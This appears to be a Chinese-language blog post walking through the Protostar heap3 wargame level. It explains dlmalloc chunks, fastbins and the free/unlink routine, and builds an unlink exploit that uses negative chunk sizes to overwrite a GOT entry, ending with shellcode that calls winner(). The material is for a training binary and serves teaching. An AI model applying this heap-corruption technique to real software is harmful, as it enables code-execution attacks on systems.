<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Binary-Hacking," />










<meta name="description" content="unlink漏洞的利用。相比于之前的题目，综合性提高了不少。">
<meta name="keywords" content="Binary-Hacking">
<meta property="og:type" content="article">
<meta property="og:title" content="Liveoverflow-0x18-heap3">
<meta property="og:url" content="http://yoursite.com/2018/10/24/Liveoverflow-0x18-heap3/index.html">
<meta property="og:site_name" content="Muirelle的博客">
<meta property="og:description" content="unlink漏洞的利用。相比于之前的题目，综合性提高了不少。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://i.imgur.com/VVU18jG.jpg">
<meta property="og:image" content="https://i.imgur.com/fw4Qifr.png">
<meta property="og:image" content="https://i.imgur.com/NgNLg77.png">
<meta property="og:image" content="https://i.imgur.com/a7vyOnN.png">
<meta property="og:image" content="https://i.imgur.com/9It77IJ.png">
<meta property="og:image" content="https://i.imgur.com/gfFdfsx.png">
<meta property="og:image" content="https://i.imgur.com/zrw2ipm.png">
<meta property="og:image" content="https://i.imgur.com/HqkixGK.jpg">
<meta property="og:image" content="https://i.imgur.com/ZbUvKIJ.png">
<meta property="og:image" content="https://i.imgur.com/ucPIVN4.png">
<meta property="og:image" content="https://i.imgur.com/dQCduiz.png">
<meta property="og:image" content="https://i.imgur.com/6Pm8wmx.png">
<meta property="og:image" content="https://i.imgur.com/ZnLBJjM.png">
<meta property="og:image" content="https://i.imgur.com/aIK56er.png">
<meta property="og:image" content="https://i.imgur.com/wrUe4QX.png">
<meta property="og:image" content="https://i.imgur.com/UNbu1rM.png">
<meta property="og:image" content="https://i.imgur.com/2hbOnx8.png">
<meta property="og:updated_time" content="2018-10-27T06:04:58.350Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Liveoverflow-0x18-heap3">
<meta name="twitter:description" content="unlink漏洞的利用。相比于之前的题目，综合性提高了不少。">
<meta name="twitter:image" content="https://i.imgur.com/VVU18jG.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2018/10/24/Liveoverflow-0x18-heap3/"/>





  <title>Liveoverflow-0x18-heap3 | Muirelle的博客</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Muirelle的博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/24/Liveoverflow-0x18-heap3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Muirelle">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Muirelle的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Liveoverflow-0x18-heap3</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-24T18:45:43+08:00">
                2018-10-24
              </time>
            

            

            
          </span>

          

          
            
          

          
          
             <span id="/2018/10/24/Liveoverflow-0x18-heap3/" class="leancloud_visitors" data-flag-title="Liveoverflow-0x18-heap3">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>unlink漏洞的利用。相比于之前的题目，综合性提高了不少。</p>
<a id="more"></a>
<p>视频链接：<a href="http://liveoverflow.com/binary_hacking/" target="_blank" rel="noopener">http://liveoverflow.com/binary_hacking/</a></p>
<hr>
<h1 id="Protostar-Heap3"><a href="#Protostar-Heap3" class="headerlink" title="Protostar Heap3"></a>Protostar Heap3</h1><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p><strong>This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to change program execution.</strong></p>
<p><strong>This level is at /opt/protostar/bin/heap3</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"that wasn't too bad now, was it? @ %d\n"</span>, time(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *a, *b, *c;</span><br><span class="line"></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  b = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  c = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(a, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(b, argv[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(c, argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"dynamite failed?\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h1><p>首先需要大致了解malloc的相关知识，从网上找各种资料和图片都有细微的差异，虽然有些枯燥，但还是看源码实在一些。</p>
<p>这是<code>malloc_chunk</code>在malloc.c中的定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>由此可以画出chunk结构示意图(简化)：</p>
<p><img src="https://i.imgur.com/VVU18jG.jpg" alt=""></p>
<p><code>prev_size</code>存储前一个块的大小，<code>size</code>存储当前块的大小。 块大小将始终是8字节的倍数，用于对齐，这意味着size的3个最低位始终为0。 <code>malloc</code>使用这三个位，最低有效位将指示前一个块是allocated还是free。 调用<code>malloc</code>时，它会初始化<code>prev_size</code>和<code>size</code>，并在之后返回内存的地址（上图中的<code>mem</code>）。已使用的块，会忽略<code>fd</code>和<code>bk</code>，并将其内存用于程序数据。</p>
<p>当一个块是<code>free</code>的时候，它会被存储在双链表结构中，并且<code>fd</code>(<strong>forward</strong>)包含下一个<code>free chunk</code>的地址，<code>bk</code>(<strong>backward</strong>)包含前一个<code>free chunk</code>的地址。因此，这些指针覆盖<code>free chunk</code>中的mem的开头八个字节。</p>
<p>大致了解后进gdb看看究竟是怎么回事</p>
<pre><code>(gdb) set disassembly-flavor intel
(gdb) set pagination off
(gdb) disassemble main
Dump of assembler code for function main:
0x08048889 &lt;main+0&gt;:    push   ebp
0x0804888a &lt;main+1&gt;:    mov    ebp,esp
0x0804888c &lt;main+3&gt;:    and    esp,0xfffffff0
0x0804888f &lt;main+6&gt;:    sub    esp,0x20
0x08048892 &lt;main+9&gt;:    mov    DWORD PTR [esp],0x20
0x08048899 &lt;main+16&gt;:   call   0x8048ff2 &lt;malloc&gt;
0x0804889e &lt;main+21&gt;:   mov    DWORD PTR [esp+0x14],eax
0x080488a2 &lt;main+25&gt;:   mov    DWORD PTR [esp],0x20
0x080488a9 &lt;main+32&gt;:   call   0x8048ff2 &lt;malloc&gt;
0x080488ae &lt;main+37&gt;:   mov    DWORD PTR [esp+0x18],eax
0x080488b2 &lt;main+41&gt;:   mov    DWORD PTR [esp],0x20
0x080488b9 &lt;main+48&gt;:   call   0x8048ff2 &lt;malloc&gt;
0x080488be &lt;main+53&gt;:   mov    DWORD PTR [esp+0x1c],eax
0x080488c2 &lt;main+57&gt;:   mov    eax,DWORD PTR [ebp+0xc]
0x080488c5 &lt;main+60&gt;:   add    eax,0x4
0x080488c8 &lt;main+63&gt;:   mov    eax,DWORD PTR [eax]
0x080488ca &lt;main+65&gt;:   mov    DWORD PTR [esp+0x4],eax
0x080488ce &lt;main+69&gt;:   mov    eax,DWORD PTR [esp+0x14]
0x080488d2 &lt;main+73&gt;:   mov    DWORD PTR [esp],eax
0x080488d5 &lt;main+76&gt;:   call   0x8048750 &lt;strcpy@plt&gt;
0x080488da &lt;main+81&gt;:   mov    eax,DWORD PTR [ebp+0xc]
0x080488dd &lt;main+84&gt;:   add    eax,0x8
0x080488e0 &lt;main+87&gt;:   mov    eax,DWORD PTR [eax]
0x080488e2 &lt;main+89&gt;:   mov    DWORD PTR [esp+0x4],eax
0x080488e6 &lt;main+93&gt;:   mov    eax,DWORD PTR [esp+0x18]
0x080488ea &lt;main+97&gt;:   mov    DWORD PTR [esp],eax
0x080488ed &lt;main+100&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
0x080488f2 &lt;main+105&gt;:  mov    eax,DWORD PTR [ebp+0xc]
0x080488f5 &lt;main+108&gt;:  add    eax,0xc
0x080488f8 &lt;main+111&gt;:  mov    eax,DWORD PTR [eax]
0x080488fa &lt;main+113&gt;:  mov    DWORD PTR [esp+0x4],eax
0x080488fe &lt;main+117&gt;:  mov    eax,DWORD PTR [esp+0x1c]
0x08048902 &lt;main+121&gt;:  mov    DWORD PTR [esp],eax
0x08048905 &lt;main+124&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
0x0804890a &lt;main+129&gt;:  mov    eax,DWORD PTR [esp+0x1c]
0x0804890e &lt;main+133&gt;:  mov    DWORD PTR [esp],eax
0x08048911 &lt;main+136&gt;:  call   0x8049824 &lt;free&gt;
0x08048916 &lt;main+141&gt;:  mov    eax,DWORD PTR [esp+0x18]
0x0804891a &lt;main+145&gt;:  mov    DWORD PTR [esp],eax
0x0804891d &lt;main+148&gt;:  call   0x8049824 &lt;free&gt;
0x08048922 &lt;main+153&gt;:  mov    eax,DWORD PTR [esp+0x14]
0x08048926 &lt;main+157&gt;:  mov    DWORD PTR [esp],eax
0x08048929 &lt;main+160&gt;:  call   0x8049824 &lt;free&gt;
0x0804892e &lt;main+165&gt;:  mov    DWORD PTR [esp],0x804ac27
0x08048935 &lt;main+172&gt;:  call   0x8048790 &lt;puts@plt&gt;
0x0804893a &lt;main+177&gt;:  leave
0x0804893b &lt;main+178&gt;:  ret
End of assembler dump.
(gdb) b *0x080488be
Breakpoint 1 at 0x80488be: file heap3/heap3.c, line 18.
(gdb) b *0x080488f2
Breakpoint 2 at 0x804880a: file heap3/heap3.c, line 22.
(gdb) b *0x0804892e
Breakpoint 3 at 0x804892e: file heap3/heap3.c, line 28.
</code></pre><p>分别在第三个<code>malloc</code>后，<code>strcpy</code>后，第三个<code>free</code>后下断点。</p>
<p><img src="https://i.imgur.com/fw4Qifr.png" alt="123"><br>找到heap地址<strong>0x804c00</strong></p>
<p><img src="https://i.imgur.com/NgNLg77.png" alt=""></p>
<p><img src="https://i.imgur.com/a7vyOnN.png" alt=""><br>查看堆，每个颜色代表一个<strong>chunk</strong>，可以看到<strong>chunk</strong>的结构和上面的示意图一样。我们在size字段中看到0x29，则当前块的大小为40（0x28），并且前一个块正在使用中。一切都符合预期，继续。</p>
<p><img src="https://i.imgur.com/9It77IJ.png" alt=""><br>三个<code>free</code>运行后，意料之外的情况发生了，chunk被<code>free</code>之后，<code>fd</code>被正确设置了，但是<code>bk</code>貌似没有被设置，而且后两个0x29应该变成0x28来指示前面的chunk是<code>free</code>的状态才对。哪里出了问题呢？</p>
<h1 id="Fastbins"><a href="#Fastbins" class="headerlink" title="Fastbins"></a>Fastbins</h1><blockquote>
</blockquote>
<pre><code>/*
Fastbins
An array of lists holding recently freed small chunks.  Fastbins
are not doubly linked.  It is faster to single-link them, and
since chunks are never removed from the middles of these lists,
double linking is not necessary. Also, unlike regular bins, they
are not even processed in FIFO order (they use faster LIFO) since
ordering doesn&apos;t much matter in the transient contexts in which
fastbins are normally used.
Chunks in fastbins keep their inuse bit set, so they cannot
be consolidated with other free chunks. malloc_consolidate
releases all chunks in fastbins and consolidates them with
other free chunks.
*/
</code></pre><p><em>摘自<strong>malloc.c</strong></em></p>
<p><img src="https://i.imgur.com/gfFdfsx.png" alt=""></p>
<p>当块的大小不足80字节时，malloc将使用简化的数据结构(fastbins)并且忽略掉<code>prev_size</code>、<code>bk</code>和<code>prev_inuse</code>位。所以fastbins是采用单链表的形式链接的，这点不同于其他bins。</p>
<p>因此我们构造的chunk的大小必须要大于fastbins所规定的最大值，让malloc把我们构造的chunk不视为fastbins，才能利用free中的unlink漏洞。</p>
<h1 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h1><p>当free一个chunk时，如果存在与这个chunk相邻的free chunk，则free将它们合并为更大的free chunk，存储在双链表中。</p>
<p><strong>free函数的数据定义</strong><br><img src="https://i.imgur.com/zrw2ipm.png" alt=""></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* consolidate backward */</span>	<span class="comment">//向前合并</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;	<span class="comment">//判断前一个块是否为free块</span></span><br><span class="line">prevsize = p-&gt;prev_size;	<span class="comment">//当前块的前一个块大小赋值给prevsize</span></span><br><span class="line">size += prevsize;	<span class="comment">//自身大小加上前一个块的大小</span></span><br><span class="line">p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));	<span class="comment">//指向当前块的p指针指向前一个块</span></span><br><span class="line">unlink(p, bck, fwd);	<span class="comment">//unlink当前块(刚才块前面的那个块)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;	<span class="comment">//判断下一个块是否为top_chunk(边界判定)</span></span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);	<span class="comment">//取当前块的下下个块的prev_inuse位，以此判断下一个块是不是free块</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate forward */</span>	<span class="comment">//向后合并</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;	<span class="comment">//判断下一个块是否为free块</span></span><br><span class="line">unlink(nextchunk, bck, fwd);	<span class="comment">//unlink后一个块</span></span><br><span class="line">size += nextsize;	<span class="comment">//当前块大小加上后一个块大小</span></span><br><span class="line">	&#125; <span class="keyword">else</span>	<span class="comment">//若下一个块不是free块</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);	<span class="comment">//将下一个块的prev_inuse位置零</span></span><br></pre></td></tr></table></figure>
<p>以上是向前和向后合并的代码。结合注释可以很容易理解向前向后合并的操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">     bck = unsorted_chunks(av);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">     p-&gt;fd = fwd;</span><br><span class="line">     p-&gt;bk = bck;</span><br><span class="line">     <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">     bck-&gt;fd = p;</span><br><span class="line">     fwd-&gt;bk = p;</span><br><span class="line">	<span class="comment">//将当前chunk插入unsorted bin的第一个和第二个chunk之间。</span></span><br><span class="line"></span><br><span class="line">     set_head(p, size | PREV_INUSE);	<span class="comment">//设置当前chunk的size字段将前一个chunk标记为已使用。</span></span><br><span class="line">     set_foot(p, size);	<span class="comment">//修改后一个chunk的prev_size字段，设置为当前chunk的size。</span></span><br><span class="line"></span><br><span class="line">     check_free_chunk(av, p);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_head(p, s)       ((p)-&gt;size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_foot(p, s)       (((mchunkptr)((char*)(p) + (s)))-&gt;prev_size = (s))</span></span><br></pre></td></tr></table></figure>
<p>合并完成后就要将所合并的块放入unsorted bin中去并且进一步完善刚才合并的块(和本题没什么关系，但还是提一下)</p>
<p>然后再来看<code>unlink</code>(简化)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;</span></span><br><span class="line">  FD = P-&gt;fd;               </span><br><span class="line">  BK = P-&gt;bk;               </span><br><span class="line">  FD-&gt;bk = BK;              </span><br><span class="line">  BK-&gt;fd = FD;              </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>前面说了free块是存储在双链表结构中的，unlilnk的工作就是将free块从这个结构中取出来。在unlink中有两个临时指针变量<code>FD</code>和<code>BK</code>。示意图如下：</p>
<p><img src="https://i.imgur.com/HqkixGK.jpg" alt=""></p>
<p>所以unlink可以解释为：<strong>将p-&gt;bk的值写入地址为(p-&gt;fd)+12的内存，将p-&gt;fd的值写入地址为(p-&gt;bk)+8的内存。</strong></p>
<p>重点来了，如果我们可以控制p-&gt;bk和p-&gt;fd的值，理论上就可以覆盖任何内存了。<strong>所以我们可以考虑将fd覆盖为<code>printf</code>(题目中的最后一个函数)的got表项，将bk覆盖为我们放置shellcode的地址(heap中的某一处)，shellcode用来帮我们call <code>winner()</code></strong>，注意：got地址要先减去12来抵消赋值时的+12，除非shellcode超级短(≤8字节)，实际shellcode地址最好安放在表面shellcode地址(p-&gt;bk)+8之后，以免被free时的数据覆盖。</p>
<p>暂停一下，现在整理一下思路。结合前面的铺垫，先想一想我们现在能干什么。</p>
<p>首先我们需要构造两个chunk，一个chunk_A用来放置我们的got和shellcode地址；一个chunk_B大小超过fastbins，通过free掉chunk_B来触发chunk_A的unlink。</p>
<p>要触发chunk_A的unlink有两个条件。首先，A、B必须相邻，其次，A必须被malloc视为free chunk。那么一个很简单的思路就是将B放在A后面，然后将B的prev_inuse位置零，利用向前合并中的unlink<br>达到我们的目的。下面是示意图。</p>
<p><img src="https://i.imgur.com/ZbUvKIJ.png" alt=""><br>因为chunk_B(蓝框)大于fastbins，所以需要有prev_size位，我们将其设置为0x10以指示前一个块的大小为16字节，同时设置chunk_B的大小为0x64，其最低位为0，以指示前一个块为free状态。接着再依次设置chunk_A(红框)的size、fd和bk。这样看上去就可行了，但是实际上呢？</p>
<p>由于有的内存需要被0x00这种数据覆盖(比如0x00000011)也就是说我们的payload里面要出现0x00这种数据，而这是不可能实现的，因为strcpy在复制字符串时遇到空字符(0x00)会认为已经复制到了串尾于是停止复制。如果试图用非空字符串填充则会导致chunk_size太大，不仅不方便放置payload而且也没有那么多可用内存。所以貌似无论是B在A后面还是A在B后面都无法摆脱空字符这个问题。</p>
<p>用什么办法才能绕过空字符呢？</p>
<h1 id="Negative-Chunk-Size"><a href="#Negative-Chunk-Size" class="headerlink" title="Negative Chunk Size"></a>Negative Chunk Size</h1><p><img src="https://i.imgur.com/ucPIVN4.png" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr)(((char*)(p)) + (s)))</span></span><br></pre></td></tr></table></figure></p>
<p>可以看到，在free中得到nextchunk的位置的方法仅仅是用当前chunk的指针直接加上当前chunk的大小。</p>
<p>所以，如果一个chunk的大小是-4会怎么样？</p>
<p><img src="https://i.imgur.com/dQCduiz.png" alt=""></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>malloc在确定chunk的大小时，会将size数据类型视为<code>unsigned int</code>，所以-4(0xfffffffc)远大于fastbins规定大小，所以就不会被视为fastbins。</li>
<li>注意到最后两bit，prev_inuse和is_mmapped都为0，所以他的前一个chunk会被视为free chunk。</li>
<li>这个块的前一个块地址为当前块起始地址-(-4)，也就是+4。后一个块的地址为当前块起始地址+(-4)，也就是-4。</li>
</ul>
<p>于是现在可以构造一个这样的chunk_A：</p>
<p><img src="https://i.imgur.com/6Pm8wmx.png" alt=""><br><strong>红框为chunk_A，其size和prev_size都是-4。将chunk_A放在chunk_B后面，当free掉chunk_B时，会检查chunk_A是否为free chunk，所以要检查chunk_A的next chunk(蓝框)的prev_inuse位，而next chunk的size正好是chunk_A的prev_size，就是0xfffffffc，所以，正好，prev_inuse位为0，意味着chunk_A是free chunk！</strong></p>
<p>ok，现在思路完整了。</p>
<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit!"></a>Exploit!</h1><p><img src="https://i.imgur.com/ZnLBJjM.png" alt=""></p>
<p>这是最终我们期望heap的内容，说一下为什么shellcode的地址不选在第一个chunk的开始(0x804c008)，因为题目中free调用了三次，所以当最后一个free调用时(第一个块被free时)，data部分前八字节会被其他数据覆盖，因此选择在后面一点(0x804c014)安放shellcode。</p>
<p><img src="https://i.imgur.com/aIK56er.png" alt=""><br>先找到got(<strong>0x804b128</strong>)和winner(<strong>0x8048864</strong>)，别忘了前面说过的got要减12！所以是<strong>0x804b11c</strong></p>
<p><img src="https://i.imgur.com/wrUe4QX.png" alt=""><br>然后在线汇编一下，拿到shellcode</p>
<pre><code>\xB8\x64\x88\x04\x08\xFF\xD0
